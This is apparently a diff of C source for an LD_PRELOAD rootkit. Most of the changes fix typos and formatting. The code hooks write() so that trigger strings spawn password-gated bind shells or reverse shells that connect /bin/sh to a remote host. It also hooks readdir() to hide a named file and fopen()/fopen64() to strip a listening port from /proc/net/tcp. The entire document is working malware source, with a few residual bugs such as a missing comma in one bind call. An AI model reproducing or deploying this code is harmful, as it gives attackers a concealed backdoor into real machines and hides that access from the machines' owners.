@@ -26,268 +26,319 @@
 
 int ipv6_bind(void)
 {
-    struct sockaddr_in6 addr;
-    addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(LOC_PORT);
-    addr.sin6_addr = in6addr_any;
+   struct sockaddr_in6 addr;
+   addr.sin6_family = AF_INET6;
+   addr.sin6_port = htons(LOC_PORT);
+   addr.sin6_addr = in6addr_any;
 
-    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
 
-    const static int optval = 1;
+   int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
 
-    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &Ooptval, sizeof(optval));
 
-    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+   const static int optval = 1;
 
-    bind(sockfd, (struct sockaddr *)&addrm sizeof(addr));
 
-    listen(sockfd, 0);
+   setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));
 
-    int new_sockfd = accept(sockfd, NULL, NULL);
 
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(new_socketfd, count);
-    }
+   setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 
-    char input[30];
 
-    read(new_sockfd, input, sizeof(input));
-    input[strcspn(input, "\n")] = 0;
-    if (strcmp(input, PASS) == 0)
-    {
-        execve("/bin/sh", NULL, NULL);
-        close(sockfd);
-    }
-    else
-    {
-        shutdown(new_sockfd, SHUT_RDWR);
-        close(sockfd);
-    }
+   bind(sockfd, (struct sockaddr *)&addr sizeof(addr));
+
+
+   listen(sockfd, 0);
+
+
+   int new_sockfd = accept(sockfd, NULL, NULL);
+
+
+   for (int count = 0; count < 3; count++)
+   {
+       dup2(new_sockfd, count);
+   }
+
+
+   char input[30];
+
+
+   read(new_sockfd, input, sizeof(input));
+   input[strcspn(input, "\n")] = 0;
+   if (strcmp(input, PASS) == 0)
+   {
+       execve("/bin/sh", NULL, NULL);
+       close(sockfd);
+   }
+   else
+   {
+       shutdown(new_sockfd, SHUT_RDWR);
+       close(sockfd);
+   }
 }
 
 int ipv4_bind(void)
 {
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = AF_INET;
-    addr.sin_addr.s_addr = INADDR_ANNY;
+   struct sockaddr_in addr;
+   addr.sin_family = AF_INET;
+   addr.sin_port = AF_INET;
+   addr.sin_addr.s_addr = INADDR_ANY;
 
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    const static int iptval = 1;
+   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 
-    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+   const static int optval = 1;
 
-    listen(sockfd, 0);
 
-    int new_sockfd = accept(sockfd, NULL, NULL);
+   setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(new_sockfd, count);
-    }
 
-    char input[30];
+   bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
-    read(new_sockfd, input, sizeof(input));
-    input[strcmp(input, PASS)] = 0;
-    if (strcmp(input, PASS) == 0)
-    {
-        execve("/bin/sh", NULL, NULL);
-        close(sockfd);
-    }
-    else
-    {
-        shutdown(new_sockfd, SHUT_RDWR);
-        close(sockfd);
-    }
+
+   listen(sockfd, 0);
+
+
+   int new_sockfd = accept(sockfd, NULL, NULL);
+
+
+   for (int count = 0; count < 3; count++)
+   {
+       dup2(new_sockfd, count);
+   }
+
+
+   char input[30];
+
+
+   read(new_sockfd, input, sizeof(input));
+   input[strcmp(input, PASS)] = 0;
+   if (strcmp(input, PASS) == 0)
+   {
+       execve("/bin/sh", NULL, NULL);
+       close(sockfd);
+   }
+   else
+   {
+       shutdown(new_sockfd, SHUT_RDWR);
+       close(sockfd);
+   }
 }
 
 int ipv6_rev(void)
 {
-    cons char *host = REM_HOST6;
+   const char *host = REM_HOST6;
 
-    struct sockaddr_in6 addr;
-    addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(REM_PORT);
-    inet_pton(AF_INET6, HOST, &addr.sin6_addr);
 
-    struct sockaddr_in6 client;
-    client.sin6_family = AF_INET6;
-    client.sin6_port = htons(LOC_PORT);
-    client.sin6_addr = in6addr_any;
+   struct sockaddr_in6 addr;
+   addr.sin6_family = AF_INET6;
+   addr.sin6_port = htons(REM_PORT);
+   inet_pton(AF_INET6, host, &addr.sin6_addr);
 
-    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
 
-    bind(sockfd, (struct sockaddr *)&client, sizeof(client));
+   struct sockaddr_in6 client;
+   client.sin6_family = AF_INET6;
+   client.sin6_port = htons(LOC_PORT);
+   client.sin6_addr = in6addr_any;
 
-    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
-    for (int count = 0; count < 3; cont++)
-    {
-        dup2(sockfd, count);
-    }
+   int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
 
-    execve("/bin/sh", NULL, NULL);
-    close(sockfd);
 
-    return 0;
+   bind(sockfd, (struct sockaddr *)&client, sizeof(client));
+
+
+   connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+
+
+   for (int count = 0; count < 3; count++)
+   {
+       dup2(sockfd, count);
+   }
+
+
+   execve("/bin/sh", NULL, NULL);
+   close(sockfd);
+
+
+   return 0;
 }
 
 int ipv4_rev(void)
 {
-    const char *host = REM_HOST4;
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(REM_PORT);
-    inet_aton(host, &addr.sin_addr);
+   const char *host = REM_HOST4;
+   struct sockaddr_in addr;
+   addr.sin_family = AF_INET;
+   addr.sin_port = htons(REM_PORT);
+   inet_aton(host, &addr.sin_addr);
 
-    struct sockaddr_in client;
-    clietn.sin_family = AF_INET;
-    client.sin_port = htons(LOC_PORT);
-    client.sin_addr.s_addr = INADDR_ANY;
 
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+   struct sockaddr_in client;
+   client.sin_family = AF_INET;
+   client.sin_port = htons(LOC_PORT);
+   client.sin_addr.s_addr = INADDR_ANY;
 
-    bind(sockfd, (struct sockaddr *)&client, sizeof(client));
 
-    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    for (int count = 0; cunt < 3; count++)
-    {
-        dup2(sockfd, count);
-    }
 
-    execve("/bin/sh", NULL, NULL);
-    close(sockfd);
+   bind(sockfd, (struct sockaddr *)&client, sizeof(client));
 
-    return 0;
+
+   connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+
+
+   for (int count = 0; count < 3; count++)
+   {
+       dup2(sockfd, count);
+   }
+
+
+   execve("/bin/sh", NULL, NULL);
+   close(sockfd);
+
+
+   return 0;
 }
 
 ssize_t write(int fildes, const void *buf, size_t nbytes)
 {
-    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
+   ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
 
-    ssize_t result;
 
-    new_write = dlsym(TRLD_NEXT, "write");
+   ssize_t result;
 
-    char *bind4 = strstr(buf, KEY_4);
-    char *bind6 = strstr(buf, KEY_6);
-    char *rev4 = strstr(buf, KEY_R_4);
-    char *rev6 = strstr(buf, KEY_R_6);
 
-    if (bind4 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv4_bind();
-    }
+   new_write = dlsym(RTLD_NEXT, "write");
 
-    else if (bind6 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipb6_bind();
-    }
 
-    else if (rev4 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv4_rev();
-    }
+   char *bind4 = strstr(buf, KEY_4);
+   char *bind6 = strstr(buf, KEY_6);
+   char *rev4 = strstr(buf, KEY_R_4);
+   char *rev6 = strstr(buf, KEY_R_6);
 
-    else if (rev6 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv6_rev();
-    }
 
-    else
-    {
-        result = new_write(fildes, buf, nbytes);
-    }
+   if (bind4 != NULL)
+   {
+       fildes = open("/dev/null", O_WRONLY | O_APPEND);
+       result = new_write(fildes, buf, nbytes);
+       ipv4_bind();
+   }
 
-    return result;
+
+   else if (bind6 != NULL)
+   {
+       fildes = open("/dev/null", O_WRONLY | O_APPEND);
+       result = new_write(fildes, buf, nbytes);
+       ipb6_bind();
+   }
+
+
+   else if (rev4 != NULL)
+   {
+       fildes = open("/dev/null", O_WRONLY | O_APPEND);
+       result = new_write(fildes, buf, nbytes);
+       ipv4_rev();
+   }
+
+
+   else if (rev6 != NULL)
+   {
+       fildes = open("/dev/null", O_WRONLY | O_APPEND);
+       result = new_write(fildes, buf, nbytes);
+       ipv6_rev();
+   }
+
+
+   else
+   {
+       result = new_write(fildes, buf, nbytes);
+   }
+
+
+   return result;
 }
 
 struct dirent *(*old_readdir)(DIR *dir);
 struct dirent *readdir(DIR *dirp)
 {
-    old_readdir = dlsym(RTLD_NEXT, "readdir");
+   old_readdir = dlsym(RTLD_NEXT, "readdir");
 
-    struct dirent *dir;
 
-    while (dir = old_readdir(dirp))
-    {
-        if (strstr(dir->d_name, FILENAME) == 0)
-            break;
-    }
-    return dir;
+   struct dirent *dir;
+
+
+   while (dir = old_readdir(dirp))
+   {
+       if (strstr(dir->d_name, FILENAME) == 0)
+           break;
+   }
+   return dir;
 }
 
 FILE *(*orig_fopen64)(const char *pathname, const char *mode);
 FILE *fopen64(const char *pathname, const char *mode)
 {
-    orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
+   orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
 
-    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
 
-    FILE *fp;
+   char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
 
-    if (ptr_tcp != NULL)
-    {
-        char line[256];
-        FILE *temp = tmpfile64();
-        fp = orig_fopen64(pahtname, mode);
-        while (fgets(line, sizeof(line), fp))
-        {
-            char *listener = strstr(line, KEY_PORT);
-            if (listener != NULL)
-            {
-                continue;
-            }
-            else
-            {
-                fputs(line, temp);
-            }
-        }
-        return temp;
-    }
+
+   FILE *fp;
+
+
+   if (ptr_tcp != NULL)
+   {
+       char line[256];
+       FILE *temp = tmpfile64();
+       fp = orig_fopen64(pathname, mode);
+       while (fgets(line, sizeof(line), fp))
+       {
+           char *listener = strstr(line, KEY_PORT);
+           if (listener != NULL)
+           {
+               continue;
+           }
+           else
+           {
+               fputs(line, temp);
+           }
+       }
+       return temp;
+   }
 }
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *fopen(const char *pathname, const char *mode)
 {
-    orig _fopen = dlsym(RTLD_NEXT, "fopen");
+   orig_fopen = dlsym(RTLD_NEXT, "fopen");
 
-    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
 
-    FILE *fp;
+   char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
 
-    if (ptr_tcp != NULL)
-    {
-        char line[256];
-        FILE *temp = tmpfile();
-        fp = orig_fopen(pathname, mode);
-        while (fgets(line, sizeof(line), fp))
-        {
-            char *listener = strstr(line, KEY_PORT);
-            if (listener != NULL)
-            {
-                continue;
-            }
-            else
-            {
-                fputs(line, temp);
-            }
-        }
-        return temp;
-    }
-    fp = orig_fopen(pathname, mode);
-    return fp;
+
+   FILE *fp;
+
+
+   if (ptr_tcp != NULL)
+   {
+       char line[256];
+       FILE *temp = tmpfile();
+       fp = orig_fopen(pathname, mode);
+       while (fgets(line, sizeof(line), fp))
+       {
+           char *listener = strstr(line, KEY_PORT);
+           if (listener != NULL)
+           {
+               continue;
+           }
+           else
+           {
+               fputs(line, temp);
+           }
+       }
+       return temp;
+   }
+   fp = orig_fopen(pathname, mode);
+   return fp;
 }
